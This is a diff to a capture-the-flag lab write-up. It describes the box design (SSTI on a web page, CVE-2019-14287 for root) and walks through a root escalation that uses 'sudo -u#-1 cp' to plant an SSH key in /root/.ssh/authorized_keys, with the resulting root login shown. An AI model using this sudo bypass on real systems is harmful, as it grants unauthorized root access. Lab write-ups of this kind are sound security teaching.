@@ -21,7 +21,7 @@ Passwords:
 2) Apache2 server on 80 port which is restricted page vulnerable to SSTI
 3) After enumerating subclasses in SSTI players need to find number of Popen subclass
 4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
-5) There is other user besides `web` and `root` (john) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287
+5) There is other user besides `web` and `root` (john,mathew,lily) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287
 
 ### Automation / Crons
 There is no automation
@@ -168,13 +168,73 @@ There is README.txt file let's read it!
 ````
 Dear developers!
 
-We have ongoing "star map" project! We need to finish it as far as possible. User john has codes in his home directory, but I can not disclose password of user john.
-However you are allowed to copy those codes!
+We have ongoing "star map" project! We need to finish it as far as possible. 
+User john has codes in his home directory start from these codes, but I can not disclose password of any user.
+However all developers allowed to copy and paste project codes from devs directory of all user
+Please do not store sensitive information in all /home/*/devs directory
+
 Available codes:
-star-map.js
-star.html
-stars.js
+/home/john/devs/star-map.js
+/home/john/devs/star.html
+/home/john/devs/stars.js
 ````
+According to message we can copy everything from all /home/*/devs directory, we can confirm it by sudo rules:
+![image](https://github.com/user-attachments/assets/0fbcccbc-5c5b-4f79-91a3-334bb8144862)
+<br>So conlusion is we can copy anything from all devs directory of each user.<br>
+Unfortunately we can not do it as root because of `(ALL, !root)` 
+Searching other file and permission leads to nothing, after a long search we can find `sudo` uses outdated version which is vulnerable to CVE-2019-14287.
+````
+$ sudo --version
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+````
+According to this [exploit](https://www.exploit-db.com/exploits/47502) we can bypass `!root`  by using `-u#-1` id as a result vulnerable sudo reads it as `0` which is root user
+<br>
+So what we have so far:<br>
+We can bypass `!root` restriction<br>
+We only can use `cp` from `/home/*/devs` to anywhere
+<br>
+<br>
+We can copy pubic key of `web` user to the   `/root/.ssh/authorized_keys` locaton as a result we can use ssh without password<br>
+Let's first copy our public key to the `devs` directory:
+````
+cp /home/web/.ssh/id_rsa.pub /home/web/devs/key
+````
+Then we will copy that public key from  `devs` directory to the `/root/.ssh/authorized_key`:
+````
+$ sudo -u#-1 cp /home/web/devs/key /root/.ssh/authorized_keys 
+$ ssh -i /home/web/.ssh/id_rsa root@192.168.0.110
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Feb 21 10:47:28 AM UTC 2025
+
+  System load:  0.0               Processes:               109
+  Usage of /:   44.8% of 7.79GB   Users logged in:         1
+  Memory usage: 10%               IPv4 address for enp0s3: 192.168.0.110
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+16 updates can be applied immediately.
+16 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
 
 
+Last login: Fri Feb 21 10:30:09 2025 from 192.168.0.110
+root@galaxy:~#
+````
 
